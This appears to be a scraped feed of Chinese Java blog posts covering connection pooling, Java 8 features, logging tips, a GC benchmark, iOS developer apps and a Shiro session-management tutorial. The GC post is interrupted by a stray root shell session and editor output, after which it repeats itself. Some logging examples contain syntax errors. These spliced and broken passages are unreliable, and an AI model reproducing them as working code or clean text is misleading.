private static final Logger LOGGER = LoggerFactory.getLogger(DataSourceConnectionTest.class);
 
private static final int MAX_ITERATIONS = 1000;
 
private Slf4jReporter logReporter;
 
private Timer timer;
 
protected abstract DataSource getDataSource();
 
@Before
public void init() {
    MetricRegistry metricRegistry = new MetricRegistry();
    this.logReporter = Slf4jReporter
            .forRegistry(metricRegistry)
            .outputTo(LOGGER)
            .build();
    timer = metricRegistry.timer("connection");
}
 
@Test
public void testOpenCloseConnections() throws SQLException {
    for (int i = 0; i < MAX_ITERATIONS; i++) {
        Timer.Context context = timer.time();
        getDataSource().getConnection().close();
        context.stop();
    }
    logReporter.report();
}
   图中显示的是打开及关闭连接所花费的时间，当然这个时间越短则越好。   使用了连接池的实现要比没有连接池快600倍。我们的企业级系统中有大量的应用，光是一个批处理的系统每小时就会创建两百万的数据库连接，因此像这样两个数量级差距的优化当然是应该考虑的。      类型不使用连接池的情况使用了连接池的情况最短时间74.5514140.002633最长时间146.69324125.528047平均时间78.2165490.128900标准差5.94383353.969438中位数76.1504400.003218  为什么连接池如此高效？  要明白为什么连接池的性能会这么好，我们需要分析下连接池的调用流：   每当请求一个连接的时候，使用了连接池的数据源都会先通过连接池来获取一个新的连接。连接池只有当没有可用的连接并且还没有达到连接池上限的时候才会去创建新的连接。而连接池的close()方法只是把连接扔回到池里而已，并不是真的要关闭它。   更快，更安全  连接池扮演了连接请求的一个有界缓冲区的角色。如果流量瞬间出现了抖动连接池会使它变得平缓，而不是去耗尽所有的数据库资源。 等待超时的机制就像一个安全挂钩，它避免数据库服务器出现过高的负载。如果有个应用想要使用了过多的数据库资源，连接池会减缓它的调用，以免它将数据库压垮了（这样整个企业系统都会受到影响）。  能力越大，责任越大  所有的这些好处都是有代价的，连接池的配置又带来了额外的复杂性（尤其在大型的企业级应用中）。因此有了它并不能就高枕无忧了，你还得去注意连接池的许多配置项，比如： 1. 连接的最小数量2. 连接池的最大数量3. 最长空闲时间4. 获取连接超时时间5. 超时的重试次数 我的下一篇文章将会深入介绍企业级应用中数据库连接池面临的一个挑战，同时介绍下Flexy Pool是如何帮助你找到合适的连接池大小的。 代码在Github上可以下载。原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 8那些被冷落的新特性, deepinmind.iteye.com.blog.2059481, Sat, 03 May 2014 23:46:41 +0800
lambda表达式，lambda表达式，还是lambda表达式。一提到Java 8就只能听到这个，但这不过是其中的一个新功能而已，Java 8还有许多新的特性——有一些功能强大的新类或者新的用法，还有一些功能则是早就应该加到Java里了。 这里我准备介绍它的10个我个人认为非常值得了解的新特性。总会有一款适合你的，开始来看下吧。  1. default方法 这是Java语言的一个新特性，现在接口类里可以包含方法体（这就是default方法）了。这些方法会隐式的添加到实现这个接口的每个子类中。 这使得你可以在不破坏代码的前提下扩展原有库的功能。它绝对是个利器。但从另一个方面来说，这使得接口作为协议，类作为具体实现的界限开始变得有点模糊。但好处就是，它通过一个很优雅的方式使得接口变得更智能，同时还避免了代码冗余，并且扩展类库。不好的地方就是，我估计很快就会看到有在接口方法里获取this引用然后强制转化成某个具体类型的写法了。 2. 终止进程 一旦启动外部进程的话，当这个进程崩溃，挂起，或者CPU到达100%的时候，你就得回来擦屁股了。Process类现在增加了两个新的方法，可以来教训下那些不听话的进程了。 第一个是isAlive()方法，有了它你可以判断进程是否还活着。第二个方法则更加强大，它叫destroyForcibly()，你可以用它来强制的杀掉一个已经超时或者不再需要的进程。 3. StampedLock 提到这个不禁有点小激动。没有人会喜欢在代码中使用同步。用了它肯定会降低程序的吞吐量，更糟糕的话还会导致进程挂起。尽管这样，有时候你却不得不选择它。 当多个进程访问一个资源的时候，有多种方法可以进行同步。其中用得最多的一种是ReadWriteLock以及基于它的几种实现。它通过阻塞写线程的方式来允许多个线程并发的读，这样减少了线程之间的竞争。听起来还不错，但实际上这个锁实在是太太太慢了，尤其是当有许多写线程的时候。 因此Java 8引入了一个新的读写锁，叫做StampedLock。它不仅更快，同时还提供了一系列强大的API来实现乐观锁，这样如果没有写操作在访问临界区域的话，你只需很低的开销就能获取到一个读锁。访问结束后你可以查询锁来判断这期间是否发生了写操作，如果有的话再选择进行重试，升级锁，或者放弃这个操作。 这的确是一个非常强大的工具，它本身就值得专门花一篇文章来介绍。这个新玩意儿让我感到非常激动和兴奋，它真的是太棒了。 想了解更多请点击这里。 4. 并发计数器 这是多线程程序会用到的另一个小工具。它提供了简单高效的新接口来实现多线程的并发读写计数器的功能，和AtomicInteger比起来，它要更快一些。相当赞的工具。 5. Optional 不好，又有空指针了，这是所有Java开发人员的痛处。这估计是有史以来最常见的异常了，至少是1965年以来。 Java 8借鉴了Scala和Haskell，提供了一个新的Optional模板，可以用它来封装可能为空的引用。这绝不是终结空指针的银弹，更多只是使API的设计者可以在代码层面声明一个方法可能会返回空值，调用方应该注意这种情况。正因为这个，这只对新的API有效，前提是调用方不要让引用逃逸出封装类，否则的话引用可能会在外面被不安全的废弃掉。 我对这个新的特性真的是又爱又恨。一方面，空指针是一个大问题，只要能解决这个问题的东西我都欢迎。但另一方面，我对它是否能担此重任执怀疑的态度。这是由于使用它的话需要全公司的集体努力，短期内很难会有见效。除非大力地推广，否则很可能会功亏一篑。 6. 万物皆可注解 还有一个小的改进就是现在Java注解可以支持任意类型了。之前只有像类和方法声明之类的才能使用注解。在Java 8里面，当类型转化甚至分配新对象的时候，都可以在声明变量或者参数的时候使用注解。这是Java为了更好地支持静态分析及检测工具（比如FireBug)而做的工作中的一部分。这是个很不错的特性，但是和Java 7的invokeDynamic一样，它的真正价值取决于社区以后如何去使用它。 7. 数值溢出 这些方法早就该出现在Java的核心类库里了。我有个癖好就是去测试整型超出2^32时溢出的情况，搞出一些恶心的随机BUG来（怎么会得到这么奇怪的一个值？）。 同样的，这也不是什么银弹，只不过是提供了一组函数，这样你在使用+/*操作符进行数值操作的时候，如果出现了溢出，会抛一个异常。如果我可以决定的话，我会把它作为JVM的默认模式，显式的标明函数会出现数值溢出。  8. 目录遍历 遍历目录树这种事通常都得上Google搜下怎么实现（你很可能用的是Apache.FileUtils）。Java 8给Files类做了一次整容手术，增加了十个新的方法。我最喜欢的一个是walk()方法，它遍历目录后会创建出一个惰性的流（文件系统很大的情况下非常有用）。 9. 增强的随机数生成 现在经常都在讨论密码或者密钥容易遭受攻击的事。程序的安全性是项很复杂的工程，并且很容易出错。这就是我为什么喜欢这个新的SecureRandom.getinstanceStrong()方法的原因，它能自动选择出当前JVM可用的最佳的随机数生成器。这样减少了获取失败的机率，同时也避免了默认的弱随机数生成器可能会导致密钥或者加密值容易被黑客攻破的问题。 10. Date.toInstant() Java 8引入了一个新的日期API。这不难理解，因为现有的这个实在是太难用了。实际上Joda一直以来都是Java日期API的首选。不过尽管有了新的API，但仍有一个严重的问题——大量的旧代码和库仍然在使用老的API。 并且我们还知道这种现状仍将继续存在下去。到底该怎么做呢？ Java 8很优雅的解决了这个问题，它给Date类增加了一个新的方法toInstant()，它可以将Date转化成新的实现。这样你马上就可以切换到新的API，尽管现有的代码还在使用老的日期API（并且在可预见的未来仍将继续这样）。 如果你觉得有什么遗漏的或者你觉得我有什么讲的不对的地方，请不吝赐教。下面的评论框就是为这个而准备的:-)  原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
日志打印的5点建议, deepinmind.iteye.com.blog.2059266, Fri, 02 May 2014 21:36:52 +0800
最近我们介绍了几款日志分析的工具，比如Scribe和LogStash这类的开源项目，以及Splunk这样的企业级工具，还有像SumoLogic和PaperTrail这样的托管服务。你可以使用这些工具从海量的日志数据提取到一些有价值的信息。 不过还有一件事它们是帮不了你的。它们都依赖于你实际输出到日志文件里面的数据。日志数据保质保量的重任就落到你肩上了。因此万一情况不妙，你又得在日志文件不全的情况下自己去调试代码，那估计你只好赶紧把原先订好的晚餐取消掉了。 为了减少出现类似的情况，我这里想分享5点日志打印的心得，希望能对你有所帮助： 1. 线程名 就像Ringo一样，线程名应该是Java里最被低估的功能之一了。因为其实它的表述性很强。那又怎样？就像我们的名字一样，我们会给它赋予一个含义。 线程名最有用的时候应该就是多线程的情况下了。许多日志框架都会记录当前方法调用所在线程的名字。不幸的是，一般看起来都是这样的：“http-nio-8080-exec-3″，这是线程池或者容器自动分配的线程名。 我经常听到有谣传称线程名是不可变的。当然不是。线程名就是你日志中最优质的不动产，你得确保自己能正确的使用它们。通常给它赋值会带上上下文的详细信息，比如说Servlet或者任务的名字之类的，以及一些动态的上下文信息比如用户ID。 这么做的话，你的代码看起来应该是这样的： 
Thread.currentThread().setName(ProcessTask.class.getName() + “: “+ message.getID);
  更高级的做法是引入一个ThreadLocal的变量，然后配置一个appender，自动把里面的信息输出到日志中。 当多个线程同时在往文件中写入日志而你需要关注其中某个线程的时候，这个功能尤其有用。如果你在一个分布式或者SOA环境中运行的话，这么做还会有一个额外的好处，下面我们很快就会看到。 2. 分布式标识符 在SOA或者消息驱动的架构中，某个任务的执行可能会涉及到多台机器。这种架构下如果出了错要进行处理的话，要想知道到底发生了什么，这里所牵涉到的相关机器以及它们的状态就显得至关重要。很多日志分析器只是帮你把这些日志收集起来，它们假设你已经有一个唯一的标志符，可以用它来进行过滤。 从设计的角度来看，这意味着系统中每一个入站操作都需要有一个唯一的ID，处理过程中会一直携带着这个ID直到处理结束。这里如果使用持久性标识比如说用户ID之类的可能并不适合，因为在一个日志文件中一个用户可能会有多个请求在同时进行处理，这就很难提取出具体的某个处理流。UUID是个不错的选择，你可以把它存储到线程名或者TLS——ThreadLocal Storage里面。 3. 不要使用循环 你经常会看到有在循环体中进行日志打印，这么做的前提是循环的次数是有限的。 如果不出什么问题的话当然还好。不过如果代码碰到一些异常的输入导致循环无法退出的话，这就不妙了。这可不止是循环无法结束的问题了，你的程序还一直在往磁盘或者网络中写入数据。 如果只是写到自己的设备中，结果可能就只是挂了一台服务器，但如果是一个分布式的环境，就可能就是一整个集群都瘫了。所以最好还是不要在循环里面打印日志，尤其是当涉及到异常处理的时候。 我们来看一个例子，这里是在循环中来打印异常的信息： 
void read() {
    while (hasNext()) {
        try {
            readData();
        } catch {Exception e) {
            // this isn’t recommend
            logger.error(“error reading data“, e);
        }
    }
}
  如果readData()抛出异常并且hasNext()返回true，这段代码就会不停在打印日志。一个解决方法就是不要每次都打印出来： 
void read() {
    int exceptionsThrown = 0;
    while (hasNext()) {
        try {
            readData();
        } catch {Exception e) {
            if (exceptionsThrown < THRESHOLD) {
                logger.error(“error reading data", e);
                exceptionsThrown++;
            } else {
                // Now the error won’t choke the system.
            }
        }
    }
}
  还有一个方法就是把日志操作从循环中去掉，在另外的地方进行打印，只记录第一个或者最后一个异常就好了。 4. 未捕获的异常 维斯特洛有一道最后的防御墙，而你有Thread.uncaughtExceptionHandler。请确认你已经用上它们了。如果没有的话，你的异常可能这么没了，而你只能拿到很少的一些上下文信息，同时这些异常在哪打印，是否打印，你也不好控制。 如果你的代码出现异常却没有记录下来，或者记录下来了却没有相关的状态信息，那真是非常失败。 尽管在uncaughtExceptionHandler里面看似已经访问不了线程里面的任何变量了（它已经挂了），但你至少还有一个当前线程的引用。如果结合刚才提到的第一条建议的话，至少日志中还能打印出一个有意义的thread.getName()的值。 5. 捕获外部调用的异常 只要你调用到了JVM以外的接口，那么发生异常的概率就大大提升了。这包括WEB服务，HTTP,数据库，文件系统，操作系统或者其它的一些JNI调用。你得非常小心地处理每一个调用。 大多数情况下，外部调用之所以会失败是因为传入了错误的参数。为了修复这些问题，把这些请求参数记录到日志中是非常有必要的。 你可能不想记录错误信息，而是直接去抛出异常，这样做也没有问题。不过这么做的话，你要尽可能把相关的参数都收集起来，放到异常信息里面去。 你得确保在上一层调用中捕获了异常并且记录到了日志里。  
try {
    return s3client.generatePresignedUrl(request);
} catch (Exception e) {
    String err = String.format(“Error generating request: %s bucket: %s key: %s. method: %s", request, bucket, path, method);
    log.error(err, e); //这里你也可以抛出一个异常，记得把ERR信息带上。
}
    原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接  
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
G1，CMS及PARALLEL GC的比较, deepinmind.iteye.com.blog.2059081, Thu, 01 May 2014 15:07:15 +0800
 这篇文章正好接上前一年我们做的一次现实环境下不同GC算法性能比较的试验。这次我们仍然进行同样的试验，不过增加了对G1回收器的测试，并且在多个平台进行测试。今年我们测试的垃>圾回收器有如下几个： - -XX:+UseParallelOldGC- -XX:+UseConcMarkSweepGC- -XX:+UseG1GC ###运行环境 我们使用现成的JIRA任务来运行这个测试。选择它的原因非常简单——除去Minecraft（一款著名网游），愤怒的小鸟，以及Eclipse不说， JIRA应该是最著名的Java应用程序了。并且和别的候选者相比，它更能代表我们日常的业务处理流程——毕竟来说Java用得最多的地方还是在服务端的Java企业级应>用。 影响我们决定的还有一个因素—— Atlassian的工程师们发布了一个打包好的JIRA压测脚本 。我们可以直接用它来进行我们的基准测试。 我们仔细的将最新版的JIRA6.1解压，然后把它安装到Mac OS X Mavericks上。最后直接使用默认的内存参数设置来运行这个测试程序。Atlassian团队的家伙已经帮我们把参数也设置好了： {% highlight java %}-Xms256m -Xmx768m -XX:MaxPermSize=256m{% endhighlight %} 这个程序使用了JIRA的常见的几种不同功能——创建任务，分配任务，解析任务，查找及发现任务，等等。总的运行时间是30分钟。 我们使用了三种不同的GC算法来运行这个测试——Parallel，CMS， 和G1。每次测试都重新启动一个新的JVM实例，并事先把存储恢复到同样的状态。一切准备就绪后我们才开始启动压测。 ###结果 每次测试我们都通过-XX:+PrintGCTimeStamps -Xloggc:/tmp/gc.log -XX:+PrintGCDetails来收集GC日志，最后使用GCViewer来分析里面的数据。 汇总后的结果如下。注意测试结果的单位是毫秒。 <table>    <tr><td>年</td><td>Parallel</td><td>CMS</td><td>G1</td></tr>"../_posts/2014-05-01-g1-vs-cms-vs-parallel-gc.markdown" 69L, 4074C written[root@AY140109200406026f46Z _tools]# ./generate.sh Configuration file: /root/kunka/_config.yml            Source: /root/kunka       Destination: /usr/share/nginx/html/      Generating... done.[root@AY140109200406026f46Z _tools]# ./iteye.sh ---layout: posttitle: G1，CMS及PARALLEL GC的比较date: 2014-05-01 14:57:06category: GCkeywords: G1,CMS,Parallel---  这篇文章正好接上前一年我们做的一次现实环境下不同GC算法性能比较的试验。这次我们仍然进行同样的试验，不过增加了对G1回收器的测试，并且在多个平台进行测试。今年我们测试的垃圾回收器有如下几个： - -XX:+UseParallelOldGC- -XX:+UseConcMarkSweepGC- -XX:+UseG1GC 运行环境  我们使用现成的JIRA任务来运行这个测试。选择它的原因非常简单——除去Minecraft（一款著名网游），愤怒的小鸟，以及Eclipse不说， JIRA应该是最著名的Java应用程序了。并且和别的候选者相比，它更能代表我们日常的业务处理流程——毕竟来说Java用得最多的地方还是在服务端的Java企业级应用。 影响我们决定的还有一个因素—— Atlassian的工程师们发布了一个打包好的JIRA压测脚本 。我们可以直接用它来进行我们的基准测试。 我们仔细的将最新版的JIRA6.1解压，然后把它安装到Mac OS X Mavericks上。最后直接使用默认的内存参数设置来运行这个测试程序。Atlassian团队的家伙已经帮我们把参数也设置好了： 
-Xms256m -Xmx768m -XX:MaxPermSize=256m
  这个程序使用了JIRA的常见的几种不同功能——创建任务，分配任务，解析任务，查找及发现任务，等等。总的运行时间是30分钟。 我们使用了三种不同的GC算法来运行这个测试——Parallel，CMS， 和G1。每次测试都重新启动一个新的JVM实例，并事先把存储恢复到同样的状态。一切准备就绪后我们才开始启动压测。 结果  每次测试我们都通过-XX:+PrintGCTimeStamps -Xloggc:/tmp/gc.log -XX:+PrintGCDetails来收集GC日志，最后使用GCViewer来分析里面的数据。 汇总后的结果如下。注意测试结果的单位是毫秒。     年ParallelCMSG1Total GC pauses20 93018 87062 000Max GC pause7216450  说明  首先来看Parallel GC (-XX:+UseParallelOldGC)。在这30分钟的测试过程中，并行收集器的GC大概暂停了有21秒。最长的一次花了721毫秒。我们来以这个做为基准：从总的运行时间来看，GC周期减少了1.1%的吞吐量。最长的延迟时间大概是721毫秒。 下一个：CMS（-XX:+UseConcMarkSweepGC）。在30分钟的测试中，由于GC而损失的时间是19秒。吞吐量和上一次的并行模式下的差不多。不过时延方面有了明显的改善——最坏的情况下的时延减少了10倍！现在最大的GC暂停时间只有64毫秒。 最后一次测试用的是最新最潮的GC算法——GC（-XX:+UseG1GC）。运行的是同样的测试程序，不过结果的吞吐量则严重下降了。这次测试应用在GC上花费的时间超过了一分钟。和CMS只有1%的开销相比，这次的吞吐量下降了有3.5%。不过如果你不在乎吞吐量而更在乎时延的话——这方面它和前面表现最好的CMS相比还有20%的提升——G1回收器最长的暂停时间只有50ms。 结论  想通过这么一次试验来得出一个结论是非常危险的。如果你的时间充足又有相应的能力的话——你应该在自己的环境中具体情况具体分析，而不是使用一刀切的方法。 不过如果说非要得出一个结论，我认为说CMS仍然是最佳的默认选择。G1的吞吐量实在是太差，和它所减少的那点时延相比并不划算。  原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
AppStore中极客必备的十个应用, deepinmind.iteye.com.blog.2057332, Wed, 30 Apr 2014 08:56:00 +0800
最近，Lukas Eder写了篇_提高开发效率的十个工具_，他在评论里怂恿我也写一下我心目中的比较酷的工具。我决定来试一下，不过我发现要挑出最喜欢的10个工具可不是件容易的事。事实上，现在我的白板上写满了我自己作为一名程序员，经常会使用的那些很酷的工具的名字。最后我发现每一类我都能列举出个前10名来。因此，为了丰富下Lukas Eder的那个列表，我决定从极客们最想要安装到他们的苹果设备上的十个工具说起。 1.  Lisping  如果你是名函数式编程语言的粉丝，尤其对Lisp家族情有独钟的话，那你一定会喜欢Lisping。它同时支持iPhone和iPad，你可以在用它来创建并运行Scheme或者Clojure的程序。为了避免那些无处不在的圆括号亮瞎你的眼睛，这个程序还提供了一种非常有趣并且智能的编辑方式，你可以只关注当前的某个上下文。不过我承认在我的iPad上还是很难编写程序，但它仍然是个很酷的应用，我相信所有的技术达人都会喜欢的。现在你可以一边看第五遍DVD加长版的指环王，一边测试下SICP上面的Scheme小程序了。   2. Raskell  那么，如果我对动态类型的函数式语言不感冒呢？好吧，如果你更喜欢静态类型的安全性，那我相信你一定会喜欢Raskell的。你可以用它来编写和执行Haskell语言的程序，它同样也支持iPhone及iPad。好的，现在你可以一边跑着_Learn you a Haskell for Great Good _上面的代码，一边舒舒服服地趟在床上看书了，看看这回能不能搞清楚该死的单子（monad）到底是神马玩意儿？    3.  Pythonista  如果多范式编程语言才是你的菜，而你又是Python粉的话，那么Pythonista肯定是你的不二选择。这个应用同样也支持iPhone及iPad，你应该也想到了，它可以用来编写Python程序，不过它的功能还不止这个，它还支持多点触控，动画及声音，你写的程序可以充分发挥苹果设备的优势了。现在当你在等最新一集的生活大爆炸中插播的5分钟广告结束的时候，你可以尽情放飞你的的Pythonic思想了。    4.  Textastic  并不是所有我们喜欢的编程语言都有自己的应用的。因此，如果我们喜欢的是别的语言的话，我们还有一个强大的工具，叫Textastic，它为超过80种编程语言提供了语法高亮的功能，并且有非常酷的编辑功能，使得它非常适合在移动设备上使用。当在iPad或者iPhone上使用的话，键盘会自动扩展出一组新的按键，有了它们代码编写会变得更加简单。这款应用同时还支持Mac OS X，现在当你的女朋友在你耳边唠叨她在高档餐厅里吃的那顿晚餐的时候，你可以写你的很棒的开源程序了。   5. Penultimate  那软件设计方面的呢？我还没有发现特别好的用来画流程图或者UML图的应用。不过我发现，如果你有一支手写笔的话，你可以使用Penultimate来自己画设计图。我的确用这种方式画了不少不错的流程图以及UML图。用它来讨论设计，算法，或者只是记录下你的一些想法亦或关于软件的一些不错的点子的话，的确非常有用。   6.   Dash (Docs & Snippets)  你是否已经厌倦了上网搜索某个类的接口文档的日子了？是不是已经忘了某个无聊的服务的方法了？git命令的参数是什么了？该死的，每次我想要看接口文档的时候都得先在Google里面搜网址。好了，有了Dash这些日子就一去不复返了。它就像程序员的Google搜索引擎。它提供了许多不同的API文档的离线查看功能。你只需要输入一个东西，它就能找到你想要的答案。    7. Code Runner  有没有发生过这样的情况，有时候你只想测试一小段Java或者Javascript的代码，但却得打开IDE，设置一个工程才能运行？好了，有了Code Runner这些烦心事全没了。它提供了一种很简单的方式来运行任意语言的任何程序，代码片段，你只需要点击一下就可以了。它默认支持一系列的编程语言，你也可以扩展它的功能，添加对别的语言的支持。   8. Instapaper  科技发展日新月异，你很难跟上它的发展节奏。每个星期我都会找几篇有意思的文章来读一下，而且我经常都在想之前读过的某篇文章叫什么来着。为了能跟上信息的发展，对我来说，没有比Instapaper更好的工具了。我把文章保存到这里，后面当我有时间的话，再拿iPhone或者iPad离线地阅读它们。在你女朋友总说她头疼的日子里，这的确是个不错的东西。把它放在床边，这对你专注某个事情非常有帮助，相信我，有了它，你肯定会成为社区里面最IN的极客。   9. Evernote  最后，我需要有个工具能时刻记录整理我的想法。我参与了N多个项目，经常会忘了项目的一些重要的事情。我时常会不记得需求是什么，服务器的IP地址是多少，代码仓库在哪里，SSH要访问的那台开发服务器的域名是什么，还有那些正在进行的项目或者研究的一些很不错的想法。更别提那些要准备写到文章里的不错的想法了。有了Evernote这些都变得非常简单。你再也不会忘掉任何一个不错的点子或者正在研究的东西，再或者什么重要的事情。如果你把它和Evernote Web Clipper结合起来使用的话，它还能提供和上面提到的Instapaper一样的功能。   10，SSH Term Pro  如果你正在看字符版的星球大战（译注：这里有），而你又想知道上周五下班前放在服务器上运行的那个脚本是不是已经跑完了。好的，你再也不用从沙发上起来了。有了SSH Term Pro你可以通过SSH连接上你的服务器，并访问到你的终端，是不是有些小激动？有了这个工具，你老板一定非常喜欢你（译注：加班干活的事非你莫属了）。    好吧，大概就是这些了。如果你们还知道什么不错的工具，并认为是极客必需的，你还犹豫什么，赶紧拿起你的电话，呃不对，赶紧留下你的评论，我们可以一起扩充下这个列表。 原创文章转载请注明出处：http://it.deepinmind.com  英文原文链接
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
《跟我学Shiro》PDF完结版下载, jinnianshilongnian.iteye.com.blog.2049092, Fri, 18 Apr 2014 22:21:28 +0800

历经三个月左右时间，《跟我学Shiro》系列教程已经完结，暂时没有需要补充的内容，因此生成PDF版供大家下载。最近项目比较紧，没有时间解答一些疑问，暂时无法回复一些问题，很抱歉，不过可以加群（334194438/348194195）一起讨论问题。
 
点击下载《跟我学Shiro》教程PDF版。学习交流使用，请勿用于其他任何商业用途。
 
Shiro目录
第一章  Shiro简介
第二章  身份验证
第三章  授权
第四章  INI配置
第五章  编码/加密
第六章  Realm及相关对象
第七章  与Web集成
第八章 拦截器机制
第九章 JSP标签
第十章  会话管理
第十一章  缓存机制
第十二章  与Spring集成
第十三章  RememberMe
第十四章  SSL
第十五章  单点登录
第十六章  综合实例
第十七章  OAuth2集成
第十八章 并发登录人数控制
第十九章 动态URL权限控制
第二十章 无状态Web应用集成
第二十一章 授予身份及切换身份
第二十二章 集成验证码
第二十三章 多项目集中权限管理及分布式会话
第二十四章 在线会话管理
 
示例工程是Maven工程，需要了解Maven基础。
 
示例源代码：https://github.com/zhangkaitao/shiro-example；加qun 231889722 探讨Spring/Shiro技术。
 
 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////Shiro相关文章///////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
权限基础
ITeye论坛关于权限控制的讨论
RBAC新解
 
其他相关文章
Shiro官方文档
Shiro官方推荐资料
Shiro参考手册中文版 
黄勇的Shiro 源码分析
Dead_knight的Shiro源码分析
Shiro+Struts2+Spring3 加上@RequiresPermissions 后@Autowired失效 
简单shiro扩展实现NOT、AND、OR权限验证 
集成Shiro后当遇到404错误时会丢失session
 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////使用Shiro的项目///////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
springside
springside：是以Spring Framework为核心的,Pragmatic风格的JavaEE应用参考示例,是JavaEE世界中的主流技术选型,最佳实践的总结与演示。
 
springrain
springrain：springrain是spring的极简封装,spring一站式开发的范例。
springrain技术详解(1)-shiro基本权限控制
springrain技术详解(2)-权限表结构
springrain技术详解(3)-shiro的filterChainDefinitions
springrain技术详解(4)-shiro的缓存
springrain技术详解(5)-shiro的httpSession
 
ES
JavaEE项目开发脚手架：ES是一个JavaEE企业级项目的快速开发的脚手架，提供了底层抽象和通用功能，拿来即用。
 
    本文附件下载:
    
      Shiro教程.rar (1.5 MB)
已有 18 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第二十四章 在线会话管理——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2047643, Thu, 17 Apr 2014 08:51:37 +0800

 
目录贴： 跟我学Shiro目录贴
 
有时候需要显示当前在线人数、当前在线用户，有时候可能需要强制某个用户下线等；此时就需要获取相应的在线用户并进行一些操作。
 
本章基于《第十六章 综合实例》代码构建。 
 
会话控制器
@RequiresPermissions("session:*")
@Controller
@RequestMapping("/sessions")
public class SessionController {
    @Autowired
    private SessionDAO sessionDAO;
    @RequestMapping()
    public String list(Model model) {
        Collection<Session> sessions =  sessionDAO.getActiveSessions();
        model.addAttribute("sessions", sessions);
        model.addAttribute("sesessionCount", sessions.size());
        return "sessions/list";
    }
    @RequestMapping("/{sessionId}/forceLogout")
    public String forceLogout(@PathVariable("sessionId") String sessionId, 
        RedirectAttributes redirectAttributes) {
        try {
            Session session = sessionDAO.readSession(sessionId);
            if(session != null) {
                session.setAttribute(
                    Constants.SESSION_FORCE_LOGOUT_KEY, Boolean.TRUE);
            }
        } catch (Exception e) {/*ignore*/}
        redirectAttributes.addFlashAttribute("msg", "强制退出成功！");
        return "redirect:/sessions";
    }
} 
1、list方法：提供了展示所有在线会话列表，通过sessionDAO.getActiveSessions()获取所有在线的会话。
2、forceLogout方法：强制退出某一个会话，此处只在指定会话中设置Constants.SESSION_FORCE_LOGOUT_KEY属性，之后通过ForceLogoutFilter判断并进行强制退出。
 
此处展示会话列表的缺点是：sessionDAO.getActiveSessions()提供了获取所有活跃会话集合，如果做一般企业级应用问题不大，因为在线用户不多；但是如果应用的在线用户非常多，此种方法就不适合了，解决方案就是分页获取： 
Page<Session> getActiveSessions(int pageNumber, int pageSize);
Page对象除了包含pageNumber、pageSize属性之外，还包含totalSessions（总会话数）、Collection<Session> （当前页的会话）。
 
分页获取时，如果是MySQL这种关系数据库存储会话比较好办，如果使用Redis这种数据库可以考虑这样存储：
session.id=会话序列化数据
session.ids=会话id Set列表（接着可以使用LLEN获取长度，LRANGE分页获取） 
 
会话创建时（如sessionId=123），那么redis命令如下所示：   
SET session.123 "Session序列化数据"
LPUSH session.ids 123    
 
会话删除时（如sessionId=123），那么redis命令如下所示： 
DEL session.123
LREM session.ids 123    
 
获取总活跃会话：
LLEN session.ids
 
分页获取活跃会话： 
LRANGE key 0 10 #获取到会话ID
MGET session.1 session.2……  #根据第一条命令获取的会话ID获取会话数据 
 
ForceLogoutFilter
public class ForceLogoutFilter extends AccessControlFilter {
    protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception {
        Session session = getSubject(request, response).getSession(false);
        if(session == null) {
            return true;
        }
        return session.getAttribute(Constants.SESSION_FORCE_LOGOUT_KEY) == null;
    }
    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {
        try {
            getSubject(request, response).logout();//强制退出
        } catch (Exception e) {/*ignore exception*/}
        String loginUrl = getLoginUrl() + (getLoginUrl().contains("?") ? "&" : "?") + "forceLogout=1";
        WebUtils.issueRedirect(request, response, loginUrl);
        return false;
    }
} 
强制退出拦截器，如果用户会话中存在Constants.SESSION_FORCE_LOGOUT_KEY属性，表示被管理员强制退出了；然后调用Subject.logout()退出，且重定向到登录页面（自动拼上fourceLogout请求参数）。
 
登录控制器
在LoginController类的showLoginForm方法中最后添加如下代码： 
if(req.getParameter("forceLogout") != null) {
    model.addAttribute("error", "您已经被管理员强制退出，请重新登录");
} 
即如果有请求参数forceLogout表示是管理员强制退出的，在界面上显示相应的信息。
 
Shiro配置spring-config-shiro.xml
和之前的唯一区别是在shiroFilter中的filterChainDefinitions拦截器链定义中添加了forceLogout拦截器： 
/** = forceLogout,user,sysUser
测试
1、首先输入http://localhost:8080/chapter24/跳转到登录页面输入admin/123456登录；
2、登录成功后，点击菜单的“会话管理”，可以看到当前在线会话列表： 
3、点击“强制退出”按钮，会话相应的用户再点击界面的话会看到如下界面，表示已经被强制退出了：  
另外可参考我的ES中的在线会话管理功能：UserOnlineController.java，其使用数据库存储会话，并分页获取在线会话。
 
        
 
 
示例源代码：https://github.com/zhangkaitao/shiro-example；可加群 231889722 探讨Spring/Shiro技术。
        
  
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
第二十三章 多项目集中权限管理及分布式会话——《跟我学Shiro》, jinnianshilongnian.iteye.com.blog.2047168, Wed, 16 Apr 2014 08:38:09 +0800

 
目录贴： 跟我学Shiro目录贴
 
在做一些企业内部项目时或一些互联网后台时；可能会涉及到集中权限管理，统一进行多项目的权限管理；另外也需要统一的会话管理，即实现单点身份认证和授权控制。
 
